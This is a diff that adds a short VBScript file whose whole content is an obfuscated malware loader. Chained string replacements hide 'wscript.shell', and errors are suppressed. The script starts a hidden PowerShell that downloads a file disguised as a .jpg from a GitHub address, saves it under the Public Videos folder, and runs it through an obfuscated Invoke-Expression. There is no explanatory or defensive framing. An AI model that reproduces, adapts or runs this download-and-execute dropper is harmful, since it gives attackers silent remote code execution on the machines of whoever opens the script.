@@ -1,0 +1,5 @@
+On Error Resume Next
+Set SEUSEUJSD = CreateObject(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace("OEFpSleGvJLReEHDyCQdVRRvZddnYLfmOzaoMyfrleGvJnuIOcOyncGzVOkLzVOkL", "OEFpS", "w"), "leGvJ", "s"), "LReEH", "c"), "DyCQd", "r"), "VRRvZ", "i"), "ddnYL", "p"), "fmOza", "t"), "oMyfr", "."), "nuIOc", "h"), "OyncG", "e"), "zVOkL", "l"))
+SETGYHESYS = ("POWeRS")
+SEUSEUJSD.Run((SETGYHESYS)+"HeLL.eXe $a = 'C:\Users\Public\Videos\file.txt';Invoke-WebRequest -H @{'apiKey'='keyValue'} https://github.com/ZoHo0z/A/blob/main/xxx.jpg -OutFile $a;Sleep 5;IE`X([IO.File]::ReadAllText($a))"), 0
+Set ali = Nothing
